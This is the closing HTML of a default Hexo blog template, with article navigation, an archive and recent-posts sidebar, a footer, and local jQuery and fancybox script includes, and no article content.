  
    
<nav id="article-nav">
  
  
    <a href="/2023/06/14/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Hello World</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/06/14/%E9%9D%A2%E8%AF%95/">(no title)</a>
          </li>
        
          <li>
            <a href="/2023/06/14/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>